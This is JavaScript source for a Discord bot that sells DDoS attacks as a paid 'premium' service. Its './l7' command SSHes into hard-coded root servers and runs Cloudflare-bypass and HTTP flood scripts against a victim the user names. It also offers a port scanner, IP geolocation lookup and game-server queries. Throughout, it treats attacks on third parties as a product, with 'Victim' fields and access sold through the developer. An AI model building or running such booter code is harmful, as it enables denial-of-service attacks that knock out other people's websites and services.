var exec = require('ssh-exec')
var dns = require('dns');
var dbip = require('dbip')
var ping = require('ping');
var Gamedig = require('gamedig');
var scan = require('net-scan');

const { connect } = require('mongoose');
const GuildModel = require('./guild');

const Discord = require('discord.js');
const bot = new Discord.Client();
const configuration = require('./config.json')

var can_use_command = true;

// # It will connect to the server and execute the ddos stuff lool
let Server_Logins = [
	{
		user : 'root',
		host : '192.168.1.1',
		password : 'suckmydick1'
	},
	{
		user : 'root',
		host : '192.168.1.2',
		password : 'suckmydick2'
	}
]

const HelpEmbed1 = new Discord.MessageEmbed()
.setColor('#380606')
.setTitle('Free Available Commands')
.addFields(
	{ name: './premium', value: 'Shows Available Commands for Premium Members'},
	{ name: './ping <hostname/IP>', value: 'Ping a server'},
	{ name: './lookup <hostname/IP>', value: 'IP/Hostname Lookup'},
	{ name: './server <IP> <port>', value: 'Counter Strike 1.6 Server Stats'},
	{ name: 'Shows Information about Bot', value: './about'}
)
.setTimestamp()
.setFooter('Contact : DefinitelyNotJah#0001');

const HelpEmbed5 = new Discord.MessageEmbed()
.setColor('#380606')
.setTitle('Premium Available Commands')
.setDescription('Contact DefinitelyNotJah#0001 for Access')
.addFields(
	{ name: './help', value: 'Shows Free Available Commands'},
	{ name: './l7 <hostname/IP> <time> <cf/null/murder>', value: 'Layer 7 Application Attack'},
	{ name: './portscan <host/IP>', value: 'Checks for Open Ports'},
	{ name: 'Shows Information about Bot', value: './about'}
)
.setTimestamp()
.setFooter('Contact : DefinitelyNotJah#0001');

bot.on('message', async (msg) => {

	const args = msg.content.split(' ');
	const command = args.shift().toLowerCase();
	if (command === './help')
	{
		msg.channel.send(HelpEmbed1);
	}
	else if (command === './premium')
	{
		msg.channel.send(HelpEmbed5);
	}
	else if (command === './add')
	{
		if(args.length === 1 && args[0])
		{
			if(msg.author.id === configuration.DISCORD_OWNER_ID)
			{
				var TargetID = args[0].replace(/[\\<>@#&!]/g, "");
				const req = await GuildModel.findOne( { id : TargetID } );
				if(req)
				{
					return msg.channel.send(`> User already exists.`);
				}
				const doc = new GuildModel( { id : TargetID } );
				await doc.save();
				msg.channel.send('> User has been successfuly added.');
			}
			else
			{
				msg.channel.send('> You do not have access to this command');
			}
		}
	}
	else if (command === './delete' || command === './remove')
	{
		if(args.length === 1 && args[0])
		{
			if(msg.author.id === configuration.DISCORD_OWNER_ID)
			{
				var TargetID = args[0].replace(/[\\<>@#&!]/g, "");
				const req = await GuildModel.findOne( { id : TargetID } );
				if(!req)
				{
					return msg.channel.send(`> User does not exist.`);
				}
				await GuildModel.deleteOne( { id : TargetID } , (err, obj) =>
				{
					if(err)
						return msg.channel.send('> Server Error');
					msg.channel.send('> User has been successfuly deleted.');
				} );
			}
			else
			{
				msg.channel.send('> You do not have access to this command');
			}
		}
	}
	else if (command === './about')
	{
		const exampleEmbed10 = new Discord.MessageEmbed()

		.setColor('#380606')
		.setTitle('About')
		.addFields(
			{ name: 'Developer : ', value: 'DefinitelyNotJah'},
			{ name: 'Language : ', value: 'Javascript'},
			{ name: 'Website : ', value: 'GamerClub.net'},
		)
		.setTimestamp()
		.setFooter('Contact : DefinitelyNotJah#0001');

		msg.channel.send(exampleEmbed10);
	}
	else if (command === './ping') {
		if(args.length === 1 && args[0])
		{
			ping.sys.probe(args[0], function(isAlive){
		        var msg_dd = isAlive ? 'Host ' + args[0] + ' is alive' : 'Host ' + args[0] + ' is dead';
	        	const exampleEmbed2 = new Discord.MessageEmbed()

				.setColor('#380606')
				.setTitle('Ping')
				.setDescription(msg_dd)
				.setTimestamp()
				.setFooter('Contact : DefinitelyNotJah#0001');

				msg.channel.send(exampleEmbed2);
		    });
		}
		else
		{
			msg.channel.send(HelpEmbed1);
		}
	}
	else if (command === './server') {
		if(args.length === 1 && args[0])
		{
			await Gamedig.query({
			    type: 'cs16',
			    host: args[0],
			    port: 27015
			}).then((state) => {
				const exampleEmbed5 = new Discord.MessageEmbed()

				.setColor('#380606')
				.setTitle('Counter Strike 1.6 Server Stats')
				.addFields(
					{ name: 'Name : ', value: state.name},
					{ name: 'Map : ', value: state.map},
					{ name: 'Game : ', value: state.raw.game},
					{ name: 'Max Players : ', value: state.maxplayers},
					{ name: 'Online Bots : ', value: state.bots.length},
					{ name: 'Online Players : ', value: state.players.length},
				)
				.setTimestamp()
				.setFooter('Contact : DefinitelyNotJah#0001');

				msg.channel.send(exampleEmbed5);
			}).catch((error) => {
				const exampleEmbed6 = new Discord.MessageEmbed()

				.setColor('#380606')
				.setTitle('An Error has occured')
				.setDescription(error)
				.setTimestamp()
				.setFooter('Contact : DefinitelyNotJah#0001');

				msg.channel.send(exampleEmbed6);	
			});
		}
		else if(args.length === 2 && args[0] && args[1] && parseInt(args[1]) >= 0 && parseInt(args[1]) < 65536)
		{
			await Gamedig.query({
			    type: 'cs16',
			    host: args[0],
			    port: parseInt(args[1])
			}).then((state) => {
				const exampleEmbed5 = new Discord.MessageEmbed()

				.setColor('#380606')
				.setTitle('Counter Strike 1.6 Server Stats')
				.addFields(
					{ name: 'Name : ', value: state.name},
					{ name: 'Map : ', value: state.map},
					{ name: 'Game : ', value: state.raw.game},
					{ name: 'Max Players : ', value: state.maxplayers},
					{ name: 'Online Bots : ', value: state.bots.length},
					{ name: 'Online Players : ', value: state.players.length},
				)
				.setTimestamp()
				.setFooter('Contact : DefinitelyNotJah#0001');

				msg.channel.send(exampleEmbed5);
			}).catch((error) => {
				const exampleEmbed6 = new Discord.MessageEmbed()

				.setColor('#380606')
				.setTitle('An Error has occured')
				.setDescription(error)
				.setTimestamp()
				.setFooter('Contact : DefinitelyNotJah#0001');

				msg.channel.send(exampleEmbed6);	
			});
		}
		else
		{
			msg.channel.send(HelpEmbed1);
		}
	}
	else if (command === './lookup') {
		if(args.length === 1 && args[0])
		{
			dns.lookup(args[0], function(err, addresses, family){
				dbip(addresses).then(info => {
					const exampleEmbed = new Discord.MessageEmbed()

					.setColor('#380606')
					.setTitle('DNS Lookup')
					.addFields(
						{ name: 'IP Address : ', value: info["IP Address"]},
						{ name: 'Address type : ', value: info["Address type"]},
						{ name: 'Family : ', value: family },
						{ name: 'ISP : ', value: info["ISP"]},
						{ name: 'Organization : ', value: info["Organization"]},
						{ name: 'Country : ', value: info["Country"]},
						{ name: 'Region : ', value: info["State / Region"]},
						{ name: 'District : ', value: info["District / County"]},
						{ name: 'City : ', value: info["City"]},
						{ name: 'Timezone : ', value: info["Timezone"]},
						{ name: 'Coordinates : ', value: info["Coordinates"]}
					)
					
					.setTimestamp()
					.setFooter('Contact : DefinitelyNotJah#0001');

					msg.channel.send(exampleEmbed);
				})
			});
		}
		else
		{
			msg.channel.send(HelpEmbed1);
		}
	}
	else if (command === './portscan') {
		const req = await GuildModel.findOne( { id : msg.author.id } );
		if(!req)
		{
			msg.channel.send(`> Contact DefinitelyNotJah#0001 for access ;)`);
		}
		else if(args.length === 1 && args[0])
		{
			msg.channel.send(`> Doing a Port Scan, this might take a while. . .`);
			scan.port({
				host: args[0],
				start: 1,
				end: 15000,
				timeout: 2000,
				queue: 1000
			}, function(err, result) {    
				let emptyArray = []; 
				const PortScanEmbed = new Discord.MessageEmbed()

				.setColor('#380606')
				.setTitle('Port Scan')
				.addFields(
					{ name: 'Host : ', value: args[0]},
					{ name: 'Port Range : ', value: '1 - 15000'},
					{ name: 'Open Ports : ', value: result.length ? result : 'No Result'},
				)
				
				.setTimestamp()
				.setFooter('Contact : DefinitelyNotJah#0001');

				msg.channel.send(PortScanEmbed);
			});
		}
		else
		{
			msg.channel.send(HelpEmbed5);
		}
	}
	else if (command === './l7') {
		const req = await GuildModel.findOne( { id : msg.author.id } );
		if(!req)
		{
			msg.channel.send(`> Contact DefinitelyNotJah#0001 for access ;)`);
		}
		else if(!can_use_command)
		{
			msg.channel.send(`> Command is in use, please wait`);
		}
		else if (!args.length) {
			msg.channel.send(HelpEmbed5);
		}
		else if(!args[0] || !args[1] || !args[2] || args.length > 3)
		{
			msg.channel.send(HelpEmbed5);
		}
		else if(args[0] && args[1] && args[2]){
			var parsed_string = parseInt(args[1]);
			var time_out = Math.min(Math.floor(parsed_string), 600);
			if(time_out > 600 || time_out < 1 || isNaN(time_out))
			{
				msg.channel.send(`> Error, please check your command`);
			}
			else
			{
				var string_shell;
				if(args[2] === 'cf')
				{
					string_shell = "node cfbypass.js " + args[0] + " " + time_out.toString();
				}
				if(args[2] === 'murder')
				{
					string_shell = "node murder.js " + args[0] + " " + time_out.toString();
				}
				else
				{
					string_shell = "node http-null.js " + args[0] + " " + time_out.toString();
				}
				var ddos_command = "screen -S ddosing_shit -dm " + string_shell;
				can_use_command = false;

				time_out *= 1000;

				msg.channel.send(`> Command has been initialized, this may take a while.`);
				var bar = new Promise((resolve, reject) => {
					Server_Logins.forEach( async (server, index, array) => 
					{
						await exec(ddos_command, {
						  user: server.user,
						  host: server.host,
						  password: server.password,
						}, (err, stdout, stderr) => {
							if(err)
							{
								const DOSEmbed = new Discord.MessageEmbed()
								.setColor('#380606')
								.setTitle('An error has occured with server #' + index)
								.setDescription(err)
								.setTimestamp()
								.setFooter('Contact : DefinitelyNotJah#0001');

								msg.author.send(DOSEmbed);
							}
							else
							{
								const DOSEmbed = new Discord.MessageEmbed()
								.setColor('#380606')
								.setTitle('Attack Information #' + index)
								.addFields(
									{ name: 'Server : ', value: '#' + index},
									{ name: 'Victim : ', value: args[0]},
									{ name: 'Time : ', value: parsed_string},
									{ name: 'Type : ', value: 'Layer 7'},
									{ name: 'Method : ', value: args[2] === 'cf' ? 'BYPASS' : args[2] === 'murder' ? 'MURDER' : 'NULL'},
								)
								
								.setTimestamp()
								.setFooter('Contact : DefinitelyNotJah#0001');

								msg.author.send(DOSEmbed);
							}
							if (index === array.length -1) resolve();
						})
					});
				});
				bar.then(() => {
				    msg.channel.send(`> Commands has been sent successfuly.`);
				});
				setTimeout( async () => { 
					var bar2 = new Promise((resolve, reject) => {
						Server_Logins.forEach( async (server, index, array) => 
						{
							await exec("./stopdos.sh", {
							  user: server.user,
							  host: server.host,
							  password: server.password,
							}, (err, stdout, stderr) => {
								if(err)
								{
									msg.author.send('> An error has occured with server #' + index);
								}
								else
								{
									msg.author.send('> Server #' + index + ' has successfuly stopped the DoS attack.');
								}
								if (index === array.length -1) resolve();
							})
						});
					});
					bar2.then(() => {
					    msg.channel.send(`> Bot can be used once again.`);
					    can_use_command = true
					});
				}, time_out + 5000);
			}
		}
	}
});

( async () => {
	await connect(configuration.MONGO_DB, {
		useNewUrlParser: true,
		useUnifiedTopology: true
	})
	return bot.login(configuration.DISCORD_TOKEN);
})();